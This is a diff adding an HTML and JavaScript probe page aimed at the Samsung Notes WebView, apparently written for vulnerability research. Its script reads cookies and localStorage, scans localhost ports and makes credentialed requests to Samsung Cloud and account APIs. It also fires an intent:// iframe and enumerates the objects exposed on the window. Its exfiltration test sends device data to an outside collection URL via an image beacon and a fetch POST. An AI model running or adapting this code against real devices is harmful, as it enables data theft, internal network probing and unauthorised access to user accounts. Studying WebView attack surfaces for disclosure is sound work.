@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head><title>Chain Discovery</title></head>
+<body>
+<h2>Samsung Notes WebView - Chain Discovery</h2>
+<div id="r" style="font-family:monospace;white-space:pre-wrap;font-size:11px;background:#eee;padding:8px;word-break:break-all;"></div>
+<script>
+var r = document.getElementById('r');
+function log(msg) { r.textContent += msg + '\n'; }
+
+log('=== Chain Discovery Tests ===');
+log('Time: ' + new Date().toISOString());
+log('Origin: ' + location.origin);
+log('');
+
+// Test 1: Cookie access - can we read Samsung cookies?
+log('[Test 1] Cookies:');
+log('  document.cookie = "' + document.cookie + '"');
+log('');
+
+// Test 2: LocalStorage/SessionStorage
+log('[Test 2] Storage:');
+try {
+  log('  localStorage keys: ' + Object.keys(localStorage).length);
+  for (var i = 0; i < Math.min(localStorage.length, 5); i++) {
+    var key = localStorage.key(i);
+    log('    ' + key + ' = ' + localStorage.getItem(key).substring(0,50));
+  }
+} catch(e) { log('  localStorage: ' + e); }
+log('');
+
+// Test 3: Can we reach localhost services?
+log('[Test 3] Localhost service scan:');
+var ports = [8080, 8443, 9090, 5000, 3000, 8888, 7777, 4443, 55555, 8766];
+var scanned = 0;
+ports.forEach(function(port) {
+  var img = new Image();
+  img.onload = function() { log('  Port ' + port + ': OPEN (img loaded)'); };
+  img.onerror = function() {
+    scanned++;
+    // onerror fires for both closed ports AND open ports that don't serve images
+    // Use fetch for more accurate detection
+  };
+  img.src = 'http://127.0.0.1:' + port + '/favicon.ico?t=' + Date.now();
+});
+
+// More accurate port scan with fetch + timeout
+ports.forEach(function(port) {
+  var controller = new AbortController();
+  var timeout = setTimeout(function() { controller.abort(); }, 2000);
+  fetch('http://127.0.0.1:' + port + '/', {mode:'no-cors', signal:controller.signal})
+    .then(function() { log('  Port ' + port + ': REACHABLE'); clearTimeout(timeout); })
+    .catch(function(e) {
+      clearTimeout(timeout);
+      if (e.name !== 'AbortError') {
+        log('  Port ' + port + ': responded (' + e.message + ')');
+      }
+    });
+});
+log('  (scanning in background...)');
+log('');
+
+// Test 4: Can we access Samsung Cloud API with the app's auth context?
+log('[Test 4] Samsung API access:');
+fetch('https://api.samsungcloud.com/samsungnotes/v3/sync/status', {credentials:'include'})
+  .then(function(resp) { log('  Samsung Cloud API: ' + resp.status + ' ' + resp.statusText); return resp.text(); })
+  .then(function(text) { log('  Response: ' + text.substring(0,200)); })
+  .catch(function(e) { log('  Samsung Cloud API: ' + e); });
+
+fetch('https://account.samsung.com/account/check.do', {credentials:'include'})
+  .then(function(resp) { log('  Samsung Account API: ' + resp.status); return resp.text(); })
+  .then(function(text) { log('  Response: ' + text.substring(0,200)); })
+  .catch(function(e) { log('  Samsung Account: ' + e); });
+log('');
+
+// Test 5: Can we open new windows / popups?
+log('[Test 5] Window operations:');
+try {
+  var w = window.open('about:blank');
+  if (w) { log('  window.open: SUCCESS (popup opened)'); w.close(); }
+  else { log('  window.open: BLOCKED (returned null)'); }
+} catch(e) { log('  window.open: ' + e); }
+log('');
+
+// Test 6: Can we trigger navigation to custom schemes?
+log('[Test 6] Custom scheme navigation tests:');
+log('  (These will be caught by shouldOverrideUrlLoading)');
+
+// Test creating an iframe with intent:// to test if it triggers shouldOverrideUrlLoading
+try {
+  var iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = 'intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end';
+  document.body.appendChild(iframe);
+  log('  intent:// iframe: created (check if app launched)');
+} catch(e) { log('  intent:// iframe: ' + e); }
+log('');
+
+// Test 7: WebRTC / Media access
+log('[Test 7] Device access:');
+log('  navigator.mediaDevices: ' + (typeof navigator.mediaDevices));
+log('  navigator.geolocation: ' + (typeof navigator.geolocation));
+log('  navigator.bluetooth: ' + (typeof navigator.bluetooth));
+log('  navigator.usb: ' + (typeof navigator.usb));
+log('  navigator.credentials: ' + (typeof navigator.credentials));
+log('');
+
+// Test 8: Can we read the WebView's internal state?
+log('[Test 8] WebView internal:');
+log('  window.android: ' + (typeof window.android));
+log('  window.Samsung: ' + (typeof window.Samsung));
+log('  window.SamsungPay: ' + (typeof window.SamsungPay));
+log('  window.chrome: ' + (typeof window.chrome));
+try {
+  var allProps = [];
+  for (var prop in window) {
+    if (typeof window[prop] === 'object' && window[prop] !== null &&
+        prop !== 'window' && prop !== 'self' && prop !== 'frames' &&
+        prop !== 'parent' && prop !== 'top' && prop !== 'document' &&
+        prop !== 'navigator' && prop !== 'location' && prop !== 'screen' &&
+        prop !== 'history' && prop !== 'performance' && prop !== 'caches' &&
+        prop !== 'crypto' && prop !== 'indexedDB') {
+      allProps.push(prop);
+    }
+  }
+  log('  Custom window objects: ' + allProps.join(', '));
+} catch(e) {}
+log('');
+
+// Test 9: Service Worker registration
+log('[Test 9] Service Worker:');
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.getRegistrations().then(function(regs) {
+    log('  Existing registrations: ' + regs.length);
+    regs.forEach(function(reg) { log('    Scope: ' + reg.scope); });
+  }).catch(function(e) { log('  getRegistrations: ' + e); });
+  log('  serviceWorker supported: yes');
+} else {
+  log('  serviceWorker: not supported');
+}
+log('');
+
+// Test 10: Exfiltration test - can we send data out?
+log('[Test 10] Outbound data exfiltration:');
+var testData = 'device=' + navigator.userAgent + '&origin=' + location.origin;
+// Use Image beacon
+var beacon = new Image();
+beacon.src = 'https://tomerfry.github.io/random/collect?' + encodeURIComponent(testData);
+beacon.onload = function() { log('  Image beacon: sent (loaded)'); };
+beacon.onerror = function() { log('  Image beacon: sent (error, but request made)'); };
+
+// Use fetch
+fetch('https://tomerfry.github.io/random/collect', {
+  method: 'POST',
+  body: testData,
+  mode: 'no-cors'
+}).then(function() { log('  Fetch POST: sent'); })
+  .catch(function(e) { log('  Fetch POST: ' + e); });
+log('  (beacons firing in background...)');
+log('');
+
+// Test 11: DOM manipulation - can we inject UI elements?
+log('[Test 11] UI injection:');
+log('  Can create elements: yes (this page is proof)');
+log('  document.title: ' + document.title);
+log('');
+
+// Delayed results collection
+setTimeout(function() {
+  log('');
+  log('=== Delayed Results (2s) ===');
+  log('Cookie check: "' + document.cookie + '"');
+}, 2000);
+
+setTimeout(function() {
+  log('');
+  log('=== Delayed Results (5s) ===');
+  log('All tests complete.');
+}, 5000);
+
+</script>
+</body>
+</html>
